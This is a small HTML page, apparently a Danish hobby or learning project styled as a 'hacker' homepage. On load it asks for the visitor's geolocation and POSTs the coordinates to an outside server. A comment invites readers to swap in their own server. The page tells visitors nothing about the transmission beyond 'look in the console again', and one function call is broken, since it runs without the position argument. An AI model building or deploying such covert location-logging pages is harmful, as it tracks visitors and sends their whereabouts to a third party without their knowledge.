<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Super Hacker Hjemmeside Med Back End</title>
    <script>
        window.onload = () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(storePosition);
                storePosition();
            } else {
                console.log("Geolocation is not supported by this browser.");
            }
        }

        const storePosition = async (position) => {
            console.log("Latitude: " + position.coords.latitude +
                "\nLongitude: " + position.coords.longitude);

            const data = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
            }

            const response = await fetch("https://christofferje.pythonanywhere.com/", { // Ã¦ndr det her til din egen server
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            });
        }
    </script>
</head>

<body>
    Kig i konsollen igen.
</body>

</html>
